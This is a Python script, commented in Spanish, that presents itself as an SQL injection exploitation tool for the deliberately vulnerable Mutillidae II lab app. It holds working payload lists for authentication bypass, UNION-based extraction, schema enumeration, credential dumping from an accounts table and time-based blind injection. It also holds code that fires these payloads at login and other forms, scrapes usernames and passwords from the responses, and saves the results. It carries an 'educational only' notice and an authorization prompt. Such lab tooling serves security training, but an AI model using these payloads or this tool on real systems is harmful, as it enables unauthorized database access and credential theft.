#!/usr/bin/env python3
"""
SQL Injection Tool for Mutillidae II
Herramienta especializada para explotar vulnerabilidades SQL injection
"""

import requests
import re
import time
import json
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import logging
from datetime import datetime

class SQLInjectionTool:
    def __init__(self, target_ip, port=80):
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}/mutillidae/"
        self.session = requests.Session()
        self.successful_injections = []
        self.extracted_data = []
        
        # Configurar headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        # Configurar logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Payloads SQL específicos y organizados
        self.basic_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR '1'='1--",
            "admin'--",
            "admin'#"
        ]
        
        self.union_payloads = [
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT null,null,null,null,null--",
            "' UNION SELECT user(),database(),version(),@@hostname,@@datadir--",
            "' UNION SELECT 1,user(),3,4,5--",
            "' UNION SELECT 1,database(),3,4,5--",
            "' UNION SELECT 1,version(),3,4,5--"
        ]
        
        self.information_schema_payloads = [
            "' UNION SELECT table_name,null,null,null,null FROM information_schema.tables--",
            "' UNION SELECT column_name,table_name,null,null,null FROM information_schema.columns--",
            "' UNION SELECT table_name,null,null,null,null FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name='accounts'--"
        ]
        
        self.data_extraction_payloads = [
            "' UNION SELECT username,password,null,null,null FROM accounts--",
            "' UNION SELECT username,password,is_admin,null,null FROM accounts--",
            "' UNION SELECT concat(username,':',password),null,null,null,null FROM accounts--",
            "' UNION SELECT username,password,firstname,lastname,signature FROM accounts--"
        ]
        
        self.time_based_payloads = [
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5(1))--",
            "' AND (SELECT SLEEP(5))--"
        ]
        
        # Páginas objetivo específicas para SQL injection
        self.sql_target_pages = [
            {
                'page': 'index.php?page=user-info.php',
                'method': 'POST',
                'params': ['username', 'password', 'user-info-php-submit-button']
            },
            {
                'page': 'index.php?page=login.php',
                'method': 'POST',
                'params': ['username', 'password', 'login-php-submit-button']
            },
            {
                'page': 'index.php?page=user-poll.php',
                'method': 'POST',
                'params': ['choice', 'initials', 'user-poll-php-submit-button']
            },
            {
                'page': 'index.php?page=view-someones-blog.php',
                'method': 'POST',
                'params': ['author', 'view-someones-blog-php-submit-button']
            }
        ]

    def banner(self):
        """Banner de la herramienta"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    SQL INJECTION TOOL                        ║
║                  Mutillidae II Exploitation                  ║
╠══════════════════════════════════════════════════════════════╣
║ Target: {:<50} ║
║ Payloads: {} Basic | {} Union | {} Info Schema | {} Data    ║
╚══════════════════════════════════════════════════════════════╝
        """.format(
            self.base_url,
            len(self.basic_payloads),
            len(self.union_payloads),
            len(self.information_schema_payloads),
            len(self.data_extraction_payloads)
        ))

    def test_basic_sql_injection(self, page_info):
        """Probar inyecciones SQL básicas"""
        self.logger.info(f"🔍 Probando inyecciones básicas en {page_info['page']}")
        
        url = urljoin(self.base_url, page_info['page'])
        
        for payload in self.basic_payloads:
            try:
                # Preparar datos del formulario
                form_data = {}
                for param in page_info['params']:
                    if 'submit' in param.lower() or 'button' in param.lower():
                        form_data[param] = 'Submit'
                    elif param in ['username', 'author', 'choice']:
                        form_data[param] = payload
                    else:
                        form_data[param] = 'test'
                
                # Enviar request
                if page_info['method'].upper() == 'POST':
                    response = self.session.post(url, data=form_data, timeout=10)
                else:
                    response = self.session.get(url, params=form_data, timeout=10)
                
                # Analizar respuesta
                if self.detect_sql_success(response.text, payload, 'basic'):
                    injection_result = {
                        'type': 'Basic SQL Injection',
                        'page': page_info['page'],
                        'url': url,
                        'payload': payload,
                        'method': page_info['method'],
                        'form_data': form_data,
                        'response_length': len(response.text),
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.successful_injections.append(injection_result)
                    self.logger.warning(f"🎯 INYECCIÓN BÁSICA EXITOSA!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   Página: {page_info['page']}")
                    
                    return True
                
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.debug(f"Error con payload básico {payload}: {e}")
        
        return False

    def test_union_injection(self, page_info):
        """Probar inyecciones UNION"""
        self.logger.info(f"🔍 Probando inyecciones UNION en {page_info['page']}")
        
        url = urljoin(self.base_url, page_info['page'])
        
        for payload in self.union_payloads:
            try:
                form_data = {}
                for param in page_info['params']:
                    if 'submit' in param.lower() or 'button' in param.lower():
                        form_data[param] = 'Submit'
                    elif param in ['username', 'author', 'choice']:
                        form_data[param] = payload
                    else:
                        form_data[param] = 'test'
                
                if page_info['method'].upper() == 'POST':
                    response = self.session.post(url, data=form_data, timeout=10)
                else:
                    response = self.session.get(url, params=form_data, timeout=10)
                
                if self.detect_sql_success(response.text, payload, 'union'):
                    injection_result = {
                        'type': 'UNION SQL Injection',
                        'page': page_info['page'],
                        'url': url,
                        'payload': payload,
                        'method': page_info['method'],
                        'extracted_info': self.extract_union_data(response.text),
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.successful_injections.append(injection_result)
                    self.logger.warning(f"🎯 INYECCIÓN UNION EXITOSA!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   Información extraída: {injection_result['extracted_info']}")
                    
                    return True
                
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.debug(f"Error con payload UNION {payload}: {e}")
        
        return False

    def extract_database_structure(self, page_info):
        """Extraer estructura de la base de datos"""
        self.logger.info(f"🗄️  Extrayendo estructura de BD desde {page_info['page']}")
        
        url = urljoin(self.base_url, page_info['page'])
        
        for payload in self.information_schema_payloads:
            try:
                form_data = {}
                for param in page_info['params']:
                    if 'submit' in param.lower() or 'button' in param.lower():
                        form_data[param] = 'Submit'
                    elif param in ['username', 'author', 'choice']:
                        form_data[param] = payload
                    else:
                        form_data[param] = 'test'
                
                if page_info['method'].upper() == 'POST':
                    response = self.session.post(url, data=form_data, timeout=10)
                else:
                    response = self.session.get(url, params=form_data, timeout=10)
                
                # Buscar nombres de tablas/columnas en la respuesta
                tables = re.findall(r'\b(accounts|users|admin|blog|comments)\b', response.text, re.IGNORECASE)
                columns = re.findall(r'\b(username|password|email|firstname|lastname|signature|is_admin)\b', response.text, re.IGNORECASE)
                
                if tables or columns:
                    structure_info = {
                        'type': 'Database Structure',
                        'page': page_info['page'],
                        'payload': payload,
                        'tables_found': list(set(tables)),
                        'columns_found': list(set(columns)),
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.extracted_data.append(structure_info)
                    self.logger.warning(f"📊 ESTRUCTURA EXTRAÍDA!")
                    self.logger.warning(f"   Tablas: {structure_info['tables_found']}")
                    self.logger.warning(f"   Columnas: {structure_info['columns_found']}")
                
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.debug(f"Error extrayendo estructura: {e}")

    def extract_user_data(self, page_info):
        """Extraer datos de usuarios"""
        self.logger.info(f"👥 Extrayendo datos de usuarios desde {page_info['page']}")
        
        url = urljoin(self.base_url, page_info['page'])
        
        for payload in self.data_extraction_payloads:
            try:
                form_data = {}
                for param in page_info['params']:
                    if 'submit' in param.lower() or 'button' in param.lower():
                        form_data[param] = 'Submit'
                    elif param in ['username', 'author', 'choice']:
                        form_data[param] = payload
                    else:
                        form_data[param] = 'test'
                
                if page_info['method'].upper() == 'POST':
                    response = self.session.post(url, data=form_data, timeout=10)
                else:
                    response = self.session.get(url, params=form_data, timeout=10)
                
                # Buscar datos de usuarios
                users_data = self.extract_user_credentials(response.text)
                
                if users_data:
                    user_info = {
                        'type': 'User Data Extraction',
                        'page': page_info['page'],
                        'payload': payload,
                        'users_found': users_data,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.extracted_data.append(user_info)
                    self.logger.warning(f"👥 DATOS DE USUARIOS EXTRAÍDOS!")
                    for user in users_data:
                        self.logger.warning(f"   Usuario: {user}")
                
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.debug(f"Error extrayendo usuarios: {e}")

    def detect_sql_success(self, response_text, payload, injection_type):
        """Detectar si la inyección SQL fue exitosa"""
        response_lower = response_text.lower()
        
        # Indicadores generales de éxito
        success_indicators = [
            'mysql_fetch_array',
            'mysql_num_rows',
            'warning: mysql',
            'error in your sql syntax',
            'you have an error in your sql syntax'
        ]
        
        # Indicadores específicos por tipo
        if injection_type == 'basic':
            success_indicators.extend([
                'admin',
                'administrator',
                'welcome',
                'logged in',
                'successful'
            ])
        elif injection_type == 'union':
            success_indicators.extend([
                'mysql',
                'version',
                'database',
                'localhost',
                'root@'
            ])
        
        # Verificar indicadores
        for indicator in success_indicators:
            if indicator in response_lower:
                return True
        
        # Verificar longitud de respuesta anormal
        if len(response_text) > 8000:  # Respuesta muy larga puede indicar datos extraídos
            return True
        
        return False

    def extract_union_data(self, response_text):
        """Extraer información de respuestas UNION"""
        extracted_info = []
        
        # Buscar información del sistema
        version_match = re.search(r'(\d+\.\d+\.\d+)', response_text)
        if version_match:
            extracted_info.append(f"MySQL Version: {version_match.group(1)}")
        
        # Buscar nombres de base de datos
        db_patterns = ['mutillidae', 'mysql', 'information_schema']
        for pattern in db_patterns:
            if pattern in response_text.lower():
                extracted_info.append(f"Database: {pattern}")
        
        return extracted_info

    def extract_user_credentials(self, response_text):
        """Extraer credenciales de usuarios"""
        users = []
        
        # Patrones para buscar usuarios y contraseñas
        user_patterns = [
            r'admin[:\s]+([^\s<]+)',
            r'user[:\s]+([^\s<]+)',
            r'username[:\s]+([^\s<]+)',
            r'([a-zA-Z0-9_]+)[:\s]+password'
        ]
        
        for pattern in user_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                if match and len(match) > 2:
                    users.append(match)
        
        # Buscar patrones específicos de Mutillidae
        mutillidae_pattern = r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>'
        matches = re.findall(mutillidae_pattern, response_text)
        
        for match in matches:
            if len(match) == 2 and match[0] and match[1]:
                users.append(f"{match[0]}:{match[1]}")
        
        return list(set(users))  # Eliminar duplicados

    def test_time_based_injection(self, page_info):
        """Probar inyecciones basadas en tiempo"""
        self.logger.info(f"⏱️  Probando inyecciones basadas en tiempo en {page_info['page']}")
        
        url = urljoin(self.base_url, page_info['page'])
        
        for payload in self.time_based_payloads:
            try:
                form_data = {}
                for param in page_info['params']:
                    if 'submit' in param.lower() or 'button' in param.lower():
                        form_data[param] = 'Submit'
                    elif param in ['username', 'author', 'choice']:
                        form_data[param] = payload
                    else:
                        form_data[param] = 'test'
                
                start_time = time.time()
                
                if page_info['method'].upper() == 'POST':
                    response = self.session.post(url, data=form_data, timeout=15)
                else:
                    response = self.session.get(url, params=form_data, timeout=15)
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Si la respuesta tardó más de 4 segundos, probablemente sea exitosa
                if response_time > 4:
                    injection_result = {
                        'type': 'Time-based SQL Injection',
                        'page': page_info['page'],
                        'payload': payload,
                        'response_time': response_time,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.successful_injections.append(injection_result)
                    self.logger.warning(f"🎯 INYECCIÓN BASADA EN TIEMPO EXITOSA!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   Tiempo de respuesta: {response_time:.2f}s")
                    
                    return True
                
                time.sleep(1)
                
            except Exception as e:
                self.logger.debug(f"Error con payload basado en tiempo: {e}")
        
        return False

    def exploit_page(self, page_info):
        """Explotar una página específica"""
        self.logger.info(f"🎯 Explotando {page_info['page']}")
        
        # Probar diferentes tipos de inyección en orden
        if self.test_basic_sql_injection(page_info):
            # Si la inyección básica funciona, intentar extraer más datos
            self.test_union_injection(page_info)
            self.extract_database_structure(page_info)
            self.extract_user_data(page_info)
        else:
            # Si no funciona la básica, probar otros tipos
            self.test_union_injection(page_info)
            self.test_time_based_injection(page_info)

    def generate_sql_report(self):
        """Generar reporte de inyecciones SQL"""
        self.logger.info("📊 Generando reporte de SQL injection...")
        
        total_injections = len(self.successful_injections)
        basic_injections = len([i for i in self.successful_injections if i['type'] == 'Basic SQL Injection'])
        union_injections = len([i for i in self.successful_injections if i['type'] == 'UNION SQL Injection'])
        time_injections = len([i for i in self.successful_injections if i['type'] == 'Time-based SQL Injection'])
        
        print("\n" + "="*80)
        print("💉 REPORTE DE SQL INJECTION - MUTILLIDAE II")
        print("="*80)
        print(f"🎯 Total de inyecciones exitosas: {total_injections}")
        print(f"🔓 Inyecciones básicas: {basic_injections}")
        print(f"🔗 Inyecciones UNION: {union_injections}")
        print(f"⏱️  Inyecciones basadas en tiempo: {time_injections}")
        print(f"📊 Datos extraídos: {len(self.extracted_data)}")
        print("="*80)
        
        if self.successful_injections:
            print("\n🎯 INYECCIONES EXITOSAS:")
            for i, injection in enumerate(self.successful_injections, 1):
                print(f"\n{i}. {injection['type']}")
                print(f"   Página: {injection['page']}")
                print(f"   Payload: {injection['payload']}")
                if 'response_time' in injection:
                    print(f"   Tiempo: {injection['response_time']:.2f}s")
        
        if self.extracted_data:
            print("\n📊 DATOS EXTRAÍDOS:")
            for i, data in enumerate(self.extracted_data, 1):
                print(f"\n{i}. {data['type']}")
                if 'users_found' in data:
                    print(f"   Usuarios: {data['users_found']}")
                if 'tables_found' in data:
                    print(f"   Tablas: {data['tables_found']}")
                if 'columns_found' in data:
                    print(f"   Columnas: {data['columns_found']}")
        
        # Guardar reporte
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'statistics': {
                'total_injections': total_injections,
                'basic_injections': basic_injections,
                'union_injections': union_injections,
                'time_injections': time_injections,
                'data_extracted': len(self.extracted_data)
            },
            'successful_injections': self.successful_injections,
            'extracted_data': self.extracted_data
        }
        
        report_filename = f'sql_injection_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"\n💾 Reporte guardado en: {report_filename}")

    def run_sql_exploitation(self):
        """Ejecutar explotación SQL completa"""
        self.banner()
        
        self.logger.info("🚀 Iniciando explotación SQL injection...")
        
        for page_info in self.sql_target_pages:
            self.exploit_page(page_info)
            time.sleep(1)  # Pausa entre páginas
        
        self.generate_sql_report()

def main():
    """Función principal"""
    print("💉 SQL INJECTION EXPLOITATION TOOL")
    print("⚠️  SOLO PARA FINES EDUCATIVOS")
    
    target_ip = input("\n🎯 IP del objetivo (Metasploitable): ").strip()
    if not target_ip:
        print("❌ IP requerida")
        return
    
    port = input("🔌 Puerto (default 80): ").strip() or "80"
    
    try:
        port = int(port)
    except ValueError:
        print("❌ Puerto debe ser un número")
        return
    
    confirm = input("\n⚠️  ¿Confirmas que tienes autorización para este test? (y/N): ").strip().lower()
    if confirm != 'y':
        print("❌ Explotación cancelada")
        return
    
    tool = SQLInjectionTool(target_ip, port)
    tool.run_sql_exploitation()

if __name__ == "__main__":
    main()
